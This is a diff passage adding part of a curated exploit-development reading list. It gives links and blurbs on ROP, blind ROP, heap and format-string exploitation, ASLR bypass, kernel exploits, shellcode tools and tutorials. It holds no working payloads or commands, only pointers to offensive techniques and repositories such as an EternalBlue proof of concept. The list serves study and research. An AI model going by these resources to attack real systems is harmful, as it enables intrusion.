+    minimize behind-the-scenes magic, and let users write simple macros. BISC
+    was developed by Dino Dai Zovi for Practical Return-oriented Programming at
+    Blackhat USA 2010 and was used for the Assured Exploitation `ng course.
+
+* [Offset-DB](http://offset-db.com/)
+
+  * This website provide you a list of useful offset that you can use for your
+    exploit.
+
+* [Example of a DLL Hijack Exploit - Winamp 5.581](https://www.exploit-db.com/exploits/14789/)
+* [Build a database of libc offsets to simplify exploitation](https://github.com/niklasb/libc-database)
+* [Return Oriented Programming Tutorial](https://github.com/akayn/demos/blob/master/Tutorials/README.md)
+* [Loading a DLL from memory](https://www.joachim-bauch.de/tutorials/loading-a-dll-from-memory/)
+* [MS17-010: EternalBlue’s Large Non-Paged Pool Overflow in SRV Driver - blog.trendmicro](http://blog.trendmicro.com/trendlabs-security-intelligence/ms17-010-eternalblue/)
+* [MS17-010 worawit](https://github.com/worawit/MS17-010)
+
+### Talks & Presentations
+
+* [Unusual Bugs(23C3)](https://www.youtube.com/watch?v=qj79Qdmw0Pk)
+
+  * In this presentation I'll present a series of unusual security bugs. Things
+    that I've ran into at some point and went "There's gotta be some security
+    consequence here". None of these are really a secret, and most of them are
+    even documented somewhere. But apparently most people don't seem to know
+    about them. What you'll see in this presentation is a list of bugs and then
+    some explanation of how these could be exploited somehow. Some of the things
+    I'll be talking about are (recursive) stack overflow, NULL pointer
+    dereferences, regular expressions and more.
+
+* [Automated vulnerability analysis of zero sized heap allocations](http://www.hackitoergosum.org/2010/HES2010-jvanegue-Zero-Allocations.pdf)
+* [OptiROP: The art of hunting ROP gadgets](https://media.blackhat.com/us-13/US-13-Quynh-OptiROP-Hunting-for-ROP-Gadgets-in-Style-WP.pdf)
+
+  * [Video](https://www.youtube.com/watch?v=_3uBybBpq48)
+  * This research attempts to solve the problem by introducing a tool named
+    OptiROP that lets exploitation writers search for ROP gadgets with semantic
+    queries. Combining sophisticated techniques such as code normalization, code
+    optimization, code slicing, SMT solver and some creative heuristic searching
+    methods, OptiROP is able to discover desired gadgets very quickly, with much
+    less efforts. Our tool also provides the detail semantic meaning of each
+    gadget found, so users can easily decide how to chain their gadgets for the
+    final shellcode.
+
+* [The Wallstreet of Windows Binaries - Marion Marschalek, Joseph Moti](https://www.youtube.com/watch?v=8zlTv7fRjV8)
+* [Wallstreet - Github Repository](https://github.com/pinkflawd/Wallstreet)
+
+  * Wallstreet of Windows binaries 7, 8, 9 err 10 sorry
+
+* [Slides - Weird - Machine Motivated Practical Page Table Shellcode & Finding Out What's Running on Your System](https://www.defcon.org/images/defcon-22/dc-22-presentations/Macaulay/DEFCON-22-Shane-Macaulay-Weird-Machine-Motivated-Practical-Page-Table-Shellcode-UPDATED.pdf)
+* [Hacking FinSpy - a Case Study - Atilla Marosi - Troopers15](https://www.youtube.com/watch?v=Mb4mfBi06K4)
+* [A brief history of Exploitation - Devin Cook](http://www.irongeek.com/i.php?page=videos/derbycon4/t514-a-brief-history-of-exploitation-devin-cook)
+* [Funky File Formats - Advanced Binary Exploitation](http://media.ccc.de/browse/congress/2014/31c3_-_5930_-_en_-_saal_6_-_201412291400_-_funky_file_formats_-_ange_albertini.html#video)
+* [Compromise-as-a-Service: Our PleAZURE.](https://www.troopers.de/events/troopers14/49_compromise-as-a-service_our_pleazure/)
+
+  * This could be a comprehensive introduction about the ubiquity of
+    virtualization, the essential role of the hypervisor, and how the security
+    posture of the overall environment depends on it. However, we decided
+    otherwise, as this is what everybody is interested in: We will describe the
+    Hyper-V architecture in detail, provide a taxonomy of hypervisor exploits,
+    and demonstrate how we found MS13-092 which had the potential to compromise
+    the whole Azure environment. Live demo included!
+
+* [Cisco ASA Episode 3: A Journey In Analysing Heaps by Cedric Halbronn - BSides Manchester2017](https://www.youtube.com/watch?v=ADYdToi6Wn0&index=21&list=PLcgqQkap1lNrOBNCXqpPqpPAqckxv0XhP)
+* [From MS08 067 To EternalBlue by Denis Isakov - BSides Manchester2017](https://www.youtube.com/watch?v=LZ_G6RdqrHA&index=13&list=PLcgqQkap1lNrOBNCXqpPqpPAqckxv0XhP)
+* [MSRC-Security-Research Github](https://github.com/Microsoft/MSRC-Security-Research/tree/master/presentations)
+
+### General Stuff /Techniques/Tricks
+
+* [Exploit Mitigation Killchain](http://0xdabbad00.com/wp-content/uploads/2013/04/exploit_mitigation_kill_chain.pdf)
+* [Mechanization of Exploits](https://github.com/REMath/literature_review/blob/master/mechanization_of_exploits.org)
+* [Exploit Tips and Techniques(ReCon2014 William Peteroy)](https://www.youtube.com/watch?v=FEXnJKXYoLM)
+* [Differential Slicing: Identifying Causal Execution Differences for Security Applications](http://bitblaze.cs.berkeley.edu/papers/diffslicing_oakland11.pdf)
+* [Art of Picking Intel Registers](http://www.swansontec.com/sregisters.html)
+* [Trampolines in x64](http://www.ragestorm.net/blogs/?p=107)
+* [Playing with canaries](https://www.elttam.com.au/blog/playing-with-canaries/)
+
+### General Stuff that I can't decide where else to put
+
+* [Root Cause Analysis – Memory Corruption Vulnerabilities](https://www.corelan.be/index.php/2013/02/26/root-cause-analysis-memory-corruption-vulnerabilities/)
+* [RAP: RIP ROP (GRSEC/PaX team)](https://pax.grsecurity.net/docs/PaXTeam-H2HC15-RAP-RIP-ROP.pdf)
+* [Counterfeit Object-oriented Programming](http://syssec.rub.de/media/emma/veroeffentlichungen/2015/03/28/COOP-Oakland15.pdf)
+* [OneRNG](http://moonbaseotago.com/onerng/theory.html)
+* [Link to Lab Writeup](https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Draft/Exploit%20Development/Lab%20for%20Practicing%20Exploit%20Writing.txt)
+
+### Acquiring Old/Vulnerable Software
+
+* [Acquiring VMs of any Windows going back to XP to Windows 10](https://www.modern.ie/en-us/virtualization-tools#downloads)
+* [OldApps.com](http://www.oldapps.com/)
+
+### Practice Exploit Development / Structured Learning
+
+* [Exploit-Challenges - A collection of vulnerable ARM binaries for practicing exploit development](https://github.com/Billy-Ellis/Exploit-Challenges)
+
+  * Here are a collection of vulnerable ARM binaries designed for beginner
+    vulnerability researchers & exploit developers to play around with and test
+    their skills!
+
+* [BinTut](https://github.com/NoviceLive/bintut)
+
+  * Dynamic or live demonstration of classical exploitation techniques of
+    typical memory corruption vulnerabilities, from debugging to payload
+    generation and exploitation, for educational purposes
+
+* [ROP Emporium](https://ropemporium.com/)
+
+  * Learn return-oriented programming through a series of challenges designed to
+    teach ROP techniques in isolation, with minimal reverse-engineering and
+    bug-hunting.
+
+* [Pwnables.kr](https://pwnable.kr)
+
+- Originally from (originally a pastebin link, which had been modified from a
+  persons personal page, i believe it may have been an r2 dev?) If you made
+  this, thank you so much; I've now added onto it and changed it from what it
+  originally was. I've kept the original creator's note as I feel it is highly
+  relevant and aligns with my goal)
+
+- "My intention with this document is for it to be somewhat of a recommended
+  reading list for the aspiring hacker. I have tried to order the articles by
+  technique and chronology. - sar"
+
+### Buffer overflows:
+
+* [How to write buffer overflows, mudge, 1995](http://insecure.org/stf/mudge_buffer_overflow_tutorial.html)
+* [Smashing the stack for fun and profit, Aleph One, 1996](http://www.phrack.com/issues.html?issue=49&id=14)
+* [Smashing the Stack for Fun and Profit in 2010](http://www.mgraziano.info/docs/stsi2010.pdf)
+* [The Frame Pointer Overwrite, klog, 1999](http://www.phrack.com/issues.html?issue=55&id=8)
+* [win32 buffer overflows, dark spyrit, 1999](http://www.phrack.com/issues.html?issue=55&id=15)
+* [Understanding Buffer Overflow Exploits](http://proactivedefender.blogspot.com/2013/05/understanding-buffer-overflows.html)
+
+### Return-into-lib / Return oriented programming:
+
+* [Getting around non-executable stack (and fix) (First public description of a return-into-libc exploit), Solar Designer, 1997](http://marc.info/?l=bugtraq&m=87602746719512)
+* [More advanced ret-into-lib(c) techniques, Nergal, 2001](http://www.phrack.com/issues.html?issue=58&id=4)
+* [On the effectiveness of address-space randomization, , 2004](http://benpfaff.org/papers/asrandom.pdf)
+* [Introduction to Return Oriented Programming (ROP) - ketansingh.net](https://ketansingh.net/Introduction-to-Return-Oriented-Programming-ROP/)
+* [Gentle introduction to ROP programming](http://blog.zynamics.com/2010/03/12/a-gentle-introduction-to-return-oriented-programming/)
+* [Borrowed code chunks exploitation technique, Sebastian Krahmer, 2005](http://www.suse.de/~krahmer/no-nx.pdf)
+* [The Geometry of Innocent Flesh on the Bone: Return-into-libc without function calls, Hovav Shacham, 2007](http://cseweb.ucsd.edu/~hovav/dist/geometry.pdf)
+* [Defeating DEP, the Immunity Debugger way, Pablo Sole,2008](http://www.immunitysec.com/downloads/DEPLIB.pdf)
+* [The Case of Return-Oriented Programming and the AVC Advantage, 2009](http://www.usenix.org/event/evtwote09/tech/full_papers/checkoway.pdf)
+* [Practical Return-Oriented Programming, Dino A. Dai Zovi, 2010](http://www.sourceconference.com/bos10pubs/Dino.pdf)
+* [Return-Oriented Programming without Returns](https://www.cs.uic.edu/~s/papers/noret_ccs2010/noret_ccs2010.pdf)
+* [Introduction to ROP programming](http://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html)
+
+#### Blind ROP
+
+* [Blind Return Oriented Programming (BROP)](http://www.scs.stanford.edu/~sorbo/brop/)
+
+  * The BROP attack makes it possible to write exploits without possessing the
+    target's binary. It requires a stack overflow and a service that restarts
+    after a crash. Based on whether a service crashes or not (i.e., connection
+    closes or stays open), the BROP attack is able to construct a full remote
+    exploit that leads to a shell. The BROP attack remotely leaks enough gadgets
+    to perform the write system call, after which the binary is transferred from
+    memory to the attacker's socket. Following that, a standard ROP attack can
+    be carried out. Apart from attacking proprietary services, BROP is very
+    useful in targeting open-source software for which the particular binary
+    used is not public (e.g., installed from source setups, Gentoo boxes, etc.).
+    The attack completes within 4,000 requests (within minutes) when tested
+    against a toy proprietary service, and real vulnerabilities in nginx and
+    MySQL.
+
+* [Hacking Blind - BROP paper](http://www.scs.stanford.edu/~sorbo/brop/bittau-brop.pdf)
+* [Blind Return Oriented Programming](http://www.scs.stanford.edu/brop/)
+* [Blind Return Oriented Programming (BROP) Attack (1)](http://ytliu.info/blog/2014/05/31/blind-return-oriented-programming-brop-attack-yi/)
+* [Blind Return Oriented Programming (BROP) Attack (2)](http://ytliu.info/blog/2014/06/01/blind-return-oriented-programming-brop-attack-er/)
+
+#### Signal ROP
+
+* [Sigreturn Oriented Programming is a real Threat](https://subs.emis.de/LNI/Proceedings/Proceedings259/2077.pdf)
+* [Playing with signals : An overview on Sigreturn Oriented Programming](https://thisissecurity.net/2015/01/03/playing-with-signals-an-overview-on-sigreturn-oriented-programming/)
+* [SROP | Signals, you say?](https://0x00sec.org/t/srop-signals-you-say/2890)
+
+#### Jump Oriented Programming
+
+* [Jump-Oriented Programming: A New Class of Code-Reusegghunte](https://www.comp.nus.edu.sg/~liangzk/papers/asiaccs11.pdf)
+* [Attacking x86 Windows Binaries by Jump Oriented Programming](http://www.uni-obuda.hu/users/szakala/INES%202013%20pendrive/61_ines2013.pdf)
+
+### Heap exploitation:
+
+* [how2heap - shellphish](https://github.com/shellphish/how2heap)
+
+  * A repository for learning various heap exploitation techniques.
+
+* [w00w00 on heap overflows, Matt Conover, 1999](http://w00w00.org/files/articles/heaptut.txt)
+* [Vudo - An object superstitiously believed to embody magical powers, Michel "MaXX" Kaempf, 2001](http://www.phrack.com/issues.html?issue=57&id=8)
+* [Once upon a free(), anonymous author, 2001](http://www.phrack.com/issues.html?issue=57&id=9)
+* [Advanced Doug Lea's malloc exploits, jp, 2003](http://www.phrack.com/issues.html?issue=61&id=6)
+* [Exploiting the wilderness, Phantasmal Phantasmagoria, 2004](http://www.derkeiler.com/Mailing-Lists/securityfocus/vuln-dev/2004-02/0024.html)
+* [Malloc Maleficarum, Phantasmal Phantasmagoria, 2005](http://www.packetstormsecurity.org/papers/attack/MallocMaleficarum.txt)
+* [Yet another free() exploitation technique, huku, 2009](http://www.phrack.com/issues.html?issue=66&id=6)
+* [Heap Feng Shui in JavaScript](https://www.blackhat.com/presentations/bh-usa-07/Sotirov/Whitepaper/bh-usa-07-sotirov-WP.pdf)
+* [heap-exploitation](https://github.com/DhavalKapil/heap-exploitation)
+
+  * This book on heap exploitation is a guide to understanding the internals of
+    glibc's heap and various attacks possible on the heap structure.
+
+* [Project HeapBleed](http://census-labs.com/news/2014/11/27/project-heapbleed/)
+
+  * CENSUS researcher Patroklos Argyroudis has recently presented a talk on heap
+    exploitation abstraction at two conferences, namely ZeroNights 2014 (Moscow,
+    Russia) and BalCCon 2014 (Novi Sad, Serbia). In the talk titled Project
+    Heapbleed, Patroklos has collected the experience of exploiting allocators
+    in various different target applications and platforms. He focused on
+    practical, reusable heap attack primitives that aim to reduce the exploit
+    development time and effort.
+
+### Format string exploitation:
+
+* [Exploiting format string vulnerabilities, scut / Team-TESO, 2001](http://crypto.stanford.edu/cs155old/cs155-spring08/papers/formatstring-1.2.pdf) \*[Advances in format string exploitation, gera, 2002](http://www.phrack.com/issues.html?issue=59&id=7)
+* [An alternative method in format string exploitation, K-sPecial, 2006](https://web.archive.org/web/20070513143544/http://www.milw0rm.com/papers/103)
+* [Maximum Overkill Two - From Format String Vulnerability to Remote Code Execution](https://barrebas.github.io/blog/2015/02/22/maximum-overkill-two-from-format-string-vulnerability-to-remote-code-execution/)
+* [Exploiting Format Strings: Getting the Shell](http://resources.infosecinstitute.com/exploiting-format-strings-getting-the-shell/)
+
+### Integer overflows:
+
+* [Big Loop Integer Protection, Oded Horovitz, 2002](http://www.phrack.com/issues.html?issue=60&id=9)
+* [Basic Integer Overflows, blexim, 2002](http://www.phrack.com/issues.html?issue=60&id=10)
+
+### Null-ptr dereference:
+
+* [Large memory management vulnerabilities, Gael Delalleau, 2005](http://cansecwest.com/core05/memory_vulns_delalleau.pdf)
+* [Exploiting the Otherwise Non-exploitable on Windows, skape, 2006](http://www.uninformed.org/?v=4&a=5&t=pdf)
+* [Vector rewrite attack, Barnaby Jack, 2007](http://www.juniper.net/solutions/literature/white_papers/Vector-Rewrite-Attack.pdf)
+* [Application-Specific Attacks: Leveraging the ActionScript Virtual Machine, Mark Dowd, 2008](http://documents.iss.net/whitepapers/IBM_X-Force_WP_final.pdf)
+
+### JIT-spray:
+
+* [Pointer inference and JIT-Spraying, Dion Blazakis, 2010](http://www.semantiscope.com/research/BHDC2010/BHDC-2010-Paper.pdf)
+* [Writing JIT shellcode for fun and profit, Alexey Sintsov, 2010](http://dsecrg.com/files/pub/pdf/Writing%20JIT-Spray%20Shellcode%20for%20fun%20and%20profit.pdf)
+* [INTERPRETER EXPLOITATION: POINTER INFERENCE AND JIT SPRAYING](http://www.semantiscope.com/research/BHDC2010/BHDC-2010-Paper.pdf)
+* [Understanding JIT Spray](http://blog.cdleary.com/2011/08/understanding-jit-spray/)
+* [Writing JIT-Spray Shellcode For Fun And Profit](https://packetstormsecurity.com/files/86975/Writing-JIT-Spray-Shellcode-For-Fun-And-Profit.html)
+
+### ASLR:
+
+* [Exploit writing tutorial part 6 : Bypassing Stack Cookies, SafeSeh, SEHOP, HW DEP and ASLR](https://www.corelan.be/index.php/2009/09/21/exploit-writing-tutorial-part-6-bypassing-stack-cookies-safeseh-hw-dep-and-aslr/)
+* [Aslr Smack and Laugh Reference](http://www-users.rwth-aachen.de/Tilo.Mueller/ASLRpaper.pdf)
+* [Advanced Buffer Overflow Methods](http:/www.cs.tau.ac.il/tausec/lectures/Advanced_Buffer_Overflow_Methods.ppt)
+* [Smack the Stack](http://www.sts.synflood.de/dump/doc/smackthestack.txt)
+* [Exploiting the random number generator to bypass ASLR](https://www.blackhat.com/presentations/bh-europe-09/Fritsch/Blackhat-Europe-2009-Fritsch-Bypassing-aslr-whitepaper.pdf)
+* [Wikipedia on ASLR](https://www.en.wikipedia.org/wiki/Address_space_layout_randomization)
+* [Bypassing Memory Protections: The Future of Exploitation](http://www.usenix.org/events/sec09/tech/slides/sotirov.pdf)
+* [On the Effectiveness of Address-Space Randomization](https://www.stanford.edu/~blp/papers/asrandom.pdf)
+* [Exploiting with linux-gate.so.1](https://web.archive.org/web/20100205151431/milw0rm.com/papers/55)
+* [Circumventing the VA kernel patch For Fun and Profit](https://web.archive.org/web/20090826171410/http://www.milw0rm.com:80/papers/94)
+* [Defeating the Matasano C++ Challenge](https://timetobleed.com/defeating-the-matasano-c-challenge-with-aslr-enabled/)
+* [Bypassing PaX ASLR protection](https://www.phrack.com/issues.html?issue=59&id=9)
+* [Thoughts about ASLR, NX Stack and format string attacks](https://www.nibbles.tuxfamily.org/?p=1190)
+* [Return-into-libc without Function Calls](http://www.cseweb.ucsd.edu/~hovav/dist/geometry.pdf)
+* [Linux ASLR Curiosities. Tavis Ormandy. Julien Tinnes](https://www.cr0.org/paper/to-jt-linux-alsr-leak.pdf)
+* [Fun With Info-Leaks(DEP+ASLR bypass)](https://rh0dev.github.io/blog/2015/fun-with-info-leaks/)
+
+  * This article is about information leaks in form of memory disclosures
+    created in Internet Explorer 10 32-bit on Windows 7 64-bit. They are used to
+    bypass full ASLR/DEP to gain remote code execution. While the software
+    containing the bug might not be that popular, it's quite nice what can be
+    done with the bug.
+
+* [Exploiting Buffer Overflows On Kernels With Aslr Enabled Using Brute Force On The Stack Layer](http://www.securitytube.net/video/273)
+* [Bypassing The Linux Kernel Aslr And Exploiting A Buffer Overflow Vulnerable Application With Ret2esp](http://www.securitytube.net/video/178)
+
+  * This video tutorial illustrates how to exploit an application vulnerable to
+    buffer overflow under a modern 2.6 Linux kernel with ASLR, bypassing stack
+    layer randomization by search a jmp \*%esp inside the executable file and
+    forcing our program to jump there.
+
+* [Exploiting A Buffer Overflow Under Linux Kernel 2.6 With Aslr Through Ret2reg](http://www.securitytube.net/video/236)
+
+  * Linux kernel versions 2.6.x implement ASLR to faexecution of arbitrary code
+    located in the stack segment of a process. Moreover, kernel versions >=
+    2.6.18 also made the allocation of ld-linux.so.2 dynamic, and recent
+    compilers also tend to avoid the generation of jmp|call \*%esp instructions,
+    so the use of a ret2esp technique to exploit a vulnerable application is
+    becoming harder and harder. A way to turn around the problem is analyzing
+    the registers situations just a while before the vulnerable code is
+    executed: very probably one of them points to the address of the vulnerable
+    buffer. All we have to do is searching inside the executable or a static
+    library a ret2reg instruction, where reg is the register pointing to the
+    vulnerable area, and use that as return address.
+
+* [Pwn2Own 2010 Windows 7 I nternet Explorer 8 exploit](http://vreugdenhilresearch.nl/Pwn2Own-2010-Windows7-InternetExplorer8.pdf)
+
+### Kernel Exploitation
+
+* [Attacking the Core : Kernel Exploiting Notes](http://phrack.org/issues/64/6.html)
+* [Much ado about NULL: Exploiting a kernel NULL dereference](https://blogs.oracle.com/ksplice/entry/much_ado_about_null_exploiting)
+* [Integer Overflow in FreeBSD Kernel(2002)](http://archives.neohapsis.com/archives/vulnwatch/2003-q1/att-0006/01-pine-cert-20030101.txt.asc)
+* [Post MS06-035 Mailslot DoS Workaround(Kernel Null Ptr Deref)](http://eeyeresearch.typepad.com/blog/2006/08/post_ms06035_ma.html)
+* https://lkml.org/lkml/2010/5/27/490
+* [Attacking the XNU Kernel For Fun And Profit: Part 1](http://blog.qwertyoruiop.com/?p=38)
+
+  * This blog post is part of a series of posts in which I will discuss several
+    techniques to own XNU, the kernel used by Apple's OS X and iOS. My focus
+    will be on heap-based attacks, such as heap overflows, double frees,
+    use-after-frees and zone confusion.
+
+### Addendum: Use-After-Free
+
+* [An Introduction to Use After Free Vulnerabilities](https://www.purehacking.com/blog/lloyd-simon/an-introduction-to-use-after-free-vulnerabilities)
+* [Exploit writing tutorial part 11 : Heap Spraying Demystified](https://www.corelan.be/index.php/2011/12/31/exploit-writing-tutorial-part-11-heap-spraying-demystified/)
+* [Part 9: Spraying the Heap [Chapter 2: Use-After-Free] – Finding a needle in a Haystack](https://www.fuzzysecurity.com/tutorials/expDev/11.html)
+* [Overwriting the .dtors section, Juan M. Bello Rivas, 2000](http://seclists.org/bugtraq/2000/Dec/175)
+* [Abusing .CTORS and .DTORS for fun 'n profit, Izik, 2006](http://vxheavens.com/lib/viz00.html)
+* [Large memory management vulnerabilities, Gael Delalleau, 2005](https://cansecwest.com/core05/memory_vulns_delalleau.pdf)
+* [Symlinks and Cryogenic Sleep](http://seclists.org/bugtraq/2000/Jan/16)
+* [Clutching at straws: When you can shift the stack pointer](http://sebug.net/paper/phrack/63/p63-0x0e_Shifting_the_Stack_Pointer.txt)
+
+### Writing Shellcode
+
+* [Shellcoding for Linux and Windows Tutorial - Steve Hannah](http://www.vividmachines.com/shellcode/shellcode.html)
+* [Phrack Magazine Extraction Utility](http://phrack.org/issues/57/18.html)
+
+  * writing ia32 alphanumeric shellcode
+
+* [shellcode tutorials](http://projectshellcode.com/?q=node/12)
+* [Writing Manual Shellcode by Hand](https://www.exploit-db.com/docs/17065.pdf)
+* [English Shellcode](http://web.cs.jhu.edu/~sam/ccs243-mason.pdf)
+
+  * History indicates that the security community commonly takes a
+    divide-and-conquer approach to battling malware threats: identify the
+    essential and inalienable components of an attack, then develop detection
+    and prevention techniques that directly target one or more of the essential
+    components. This abstraction is evident in much of the literature for buffer
+    overflow attacks including, for instance, stack protection and NOP sled
+    detection. It comes as no surprise then that we approach shellcode detection
+    and prevention in a similar fashion. However, the common belief that
+    components of polymorphic shellcode (e.g., the decoder) cannot reliably be
+    hidden suggests a more implicit and broader assumption that continues to
+    drive contemporary research: namely, that valid and complete representations
+    of shellcode are fundamentally different in structure than benign payloads.
+    While the first tenet of this assumption is philosoph- ically undeniable
+    (i.e., a string of bytes is either shellcode or it is not), truth of the
+    latter claim is less obvious if there exist encoding techniques capable of
+    producing shellcode with features nearly indistinguishable from
+    non-executable content. In this paper, we challenge the assumption that
+    shellcode must conform to superficial and discernible representations.
+    Specifically, we demonstrate a technique for automatically producing English
+    Shellcode, transforming arbitrary shellcode into a representation that is
+    superficially similar to English prose. The shellcode is completely
+    self-contained - i.e., it does not require an external loader and executes
+    as valid IA32 code)—and can typically be generated in under an hour on
+    commodity hardware. Our primary objective in this paper is to promote
+    discussion and stimulate new ideas for thinking ahead about preventive
+    measures for tackling evolutions in code-injection attacks
+
+* [Shellcode_Tools](https://github.com/MarioVilas/shellcode_tools)
+
+  * Miscellaneous tools written in Python, mostly centered around shellcodes.
+  * bin2py: Embed binary files into Python source code.
+  * shellcode2exe: Convert shellcodes into executable files for multiple
+    platforms.
+
+* [ShellSploit](https://github.com/b3mb4m/shellsploit-framework)
+* [shellnoob](https://github.com/reyammer/shellnoob)
+
+  * A shellcode writing toolkit
+
+##### Finding Opcodes:
+
+```
+Methods of finding opcodes:
+* metasploit opcode DB;
+* memdump;
+* pvefindaddr - mona.py
+```
+
+#### Egg Hunters
+
+* [Beta aaKsYS TEAM: EGG HUNTER (Windows)](https://www.exploit-db.com/docs/18482.pdf)
+
+  * Explanation of egghunters, how they work and a working demonstration on
+    windows.
+
+* [jmp2it](https://github.com/adamkramer/jmp2it)
+
+  * This will allow you to transfer EIP control to a specified offset within a
+    file containing shellcode and then pause to support a malware analysis
+    investigation The file will be mapped to memory and maintain a handle,
+    allowing shellcode to egghunt for second stage payload as would have
+    happened in original loader Patches / self modifications are dynamically
+    written to jmp2it-flypaper.out
+
+##### Misc
+
+* [rex](https://github.com/shellphish/rex)
+
+  * Shellphish's automated exploitation engine, originally created for the Cyber
+    Grand Challenge.
+
+* [Patcherex](https://github.com/shellphish/patcherex)
+
+  * Shellphish's automated patching engine, originally created for the Cyber
+    Grand Challenge.
+
+* [rappel](https://github.com/yrp604/rappel/)
+
+  * Rappel is a pretty janky assembly REPL. It works by creating a shell ELF,
+    starting it under ptrace, then continiously rewriting/running the .text
+    section, while showing the register states. It's maybe half done right now,
+    and supports Linux x86, amd64, armv7 (no thumb), and armv8 at the moment.(As
+    of Aug 2017)
+
+* [Shellcode without Sockets](https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440)
+* [Shellcodes database for study cases](http://shell-storm.org/shellcode/)
+
+#### Talks & Presentations
+
+* [Shellcode Time: Come on Grab Your Friends](http://www.irongeek.com/i.php?page=videos/derbycon4/t116-shellcode-time-come-on-grab-your-friends-wartortell)
+
+  * Packed shellcode is a common deterrent against reverse engineering.
+    Mainstream software will use it in order to protect intellectual property or
+    prevent software cracking. Malicious binaries and Capture the Flag (CTF)
+    challenges employ packed shellcode to hide their intended functionality.
+    However, creating these binaries is an involved process requiring
+    significant experience with machine language. Due to the complexity of
+    creating packed shellcode, the majority of samples are painstakingly
+    custom-created or encoded with very simple mechanisms, such as a single byte
+    XOR. In order to aid in the creation of packed shellcode and better
+    understand how to reverse engineer it, I created a tool to generate samples
+    of modular packed shellcode. During this talk, I will demonstrate the use of
+    the shellcode creation tool and how to reverse engineer the binaries it
+    creates. I will also demonstrate an automated process for unpacking the
+    binaries that are created.
+
+#### Linux Specific
+
+* [Writing my first shellcode - iptables -P INPUT ACCEPT](https://0day.work/writing-my-first-shellcode-iptables-p-input-accept/)
+
+#### Windows Specific
+
+##### General
+
+* [WinAPI for Hackers](https://www.bnxnet.com/wp-content/uploads/2015/01/WinAPIs_for_hackers.pdf)
+* [History and Advances in Windows Shellcode - Phrack 2004](http://phrack.org/issues/62/7.html)
+
+##### Tools
+
+* [sRDI](https://github.com/monoxgas/sRDI)
+
+  * Shellcode implementation of Reflective DLL Injection. Convert DLLs to
+    position independent shellcode
+
+* [ShellcodeStdio](https://github.com/jackullrich/ShellcodeStdio)
+
+  * An extensible framework for easily writing debuggable, compiler optimized,
+    position independent, x86 shellcode for windows platforms.
+
+* [WinREPL](https://github.com/zerosum0x0/WinREPL)
+
+  * x86 and x64 assembly "read-eval-print loop" shell for Windows
+
+##### Writing it
+
+* [Writing Win32 Shellcode with VisualStudio](http://winternl.com/2016/05/02/hello-world/)
+
+  * Demonstrating how to write optimized (sort of) Win32 shellcode using Visual
+    Studio’s compiler
+
+#### Writeups
+
+* [Windows Kernel Shellcode on Windows 10 – Part 1](https://improsec.com/blog//windows-kernel-shellcode-on-windows-10-part-1)
+* [Windows Kernel Shellcode on Windows 10 – Part 2](https://improsec.com/blog//windows-kernel-shellcode-on-windows-10-part-2)
+* [Windows Kernel Shellcode on Windows 10 – Part 3](https://improsec.com/blog//windows-kernel-shellcode-on-windows-10-part-3)
+* [Windows Kernel Shellcode on Windows 10 – Part 4 - There is No Code](https://improsec.com/blog//windows-kernel-shellcode-on-windows-10-part-4-there-is-no-code)
+* [Introduction to Windows shellcode development – Part 1](https://securitycafe.ro/2015/10/30/introduction-to-windows-shellcode-development-part1/)
+* [Introduction to Windows shellcode development – Part 2](https://securitycafe.ro/2015/12/14/introduction-to-windows-shellcode-development-part-2/)
+* [Introduction to Windows shellcode development – Part 3](https://securitycafe.ro/2016/02/15/introduction-to-windows-shellcode-development-part-3/)
+* [Loading and Debugging Windows Kernel Shellcodes with Windbg. Debugging DoublePulsar Shellcode.](https://vallejo.cc/2017/06/23/loading-and-debugging-windows-kernel-shellcodes-with-windbg-debugging-doublepulsar-shellcode/)
+
+### Tutorials
+
+* [Modern Windows Exploit Development](http://expdev-kiuhnm.rhcloud.com/download-the-book/)
+* [Bypassing All the Things](https://www.exodusintel.com/files/Aaron_Portnoy-Bypassing_All_Of_The_Things.pdf)
+
+  * Handholding through Vuln Discovery and Exploitation
+
+* [Smashing the Browser - From fuzzing to 0day on IE11](https://github.com/demi6od/Smashing_The_Browser)
+* [From fuzzing to 0-day](http://blog.techorganic.com/2014/05/14/from-fuzzing-to-0-day/)
+* [SQL Injection to MIPS Overflows: Part Deux](https://s3.amazonaws.com/zcutlip_storage/SQL%20Injection%20to%20MIPS%20Overflows%20-%20Part%20Deux.pdf)
+
+  * This paper is a followup to a paper presented at BlackHat USA 2012, entitled
+    SQL Injec0ons to MIPS Overflows: Rooting SOHO Routers." That previous paper
+    described how to combine SQL injection vulnerabili0es with MIPS Linux buffer
+    overflows in order to gain root on Netgear SOHO routers. This paper revisits
+    the MiniDLNA UPnP server that ships on nearly all Netgear routers in order
+    to explore what has changed in the past two years.
+
+* [Writing a stack-based overflow exploit in Ruby with the help of vulnserver.exe and Spike 2.9](https://cyberandspace.wordpress.com/category/kali-linux/)
+* [From 0-day to exploit Buffer overflow in Belkin N750 (CVE-2014-1635)](https://labs.integrity.pt/articles/from-0-day-to-exploit-buffer-overflow-in-belkin-n750-cve-2014-1635/)
+* [Smashing The Browser: From Vulnerability Discovery To Exploit](https://github.com/demi6od/Smashing_The_Browser)
+
+  * Goes from introducing a fuzzer to producing an IE11 0day
+
+* AVM Fritz!Box root RCE: From Patch to Metasploit Module
+
+  * [Part 1](http://breaking.systems/blog/2014/04/avm-fritzbox-root-rce-from-patch-to-metasploit-module-i)
+  * [Part 2](http://breaking.systems/blog/2014/04/avm-fritzbox-root-rce-from-patch-to-metasploit-module-ii)
+
+* [Tracking Down Heap Overflows with rr](https://sean.heelan.io/2016/05/31/tracking-down-heap-overflows-with-rr/)
+* [QuickZip Stack BOF 0day: a box of chocolates](https://www.corelan.be/index.php/2010/03/27/quickzip-stack-bof-0day-a-box-of-chocolates/)
+* [Shellcode Debugging with OllyDbg](https://blackc0.de/2014/06/shellcode-debugging-ollydbg/)
+* [Walking Heap using Pydbg](http://www.debasish.in/2015/02/walking-heap-using-pydbg.html)
+
+  * This is the simplest implementation of HeapWalk() API based on pydbg. Heap
+    walk API enumerates the memory blocks in the specified heap. If you are not
+    very familiar with HeapWalk() API this page has a very good example in C++.
+
+* [Firmware Exploitation with JEB: Part 1](https://www.pnfsoftware.com/blog/firmware-exploitation-with-jeb-part-1/)
+* [Microsoft Patch Analysis for Exploitation](https://www.irongeek.com/i.php?page=videos/bsidescharm2017/bsidescharm-2017-t111-microsoft-patch-analysis-for-exploitation-stephen-sims)
+
+  * Since the early 2000's Microsoft has distributed patches on the second
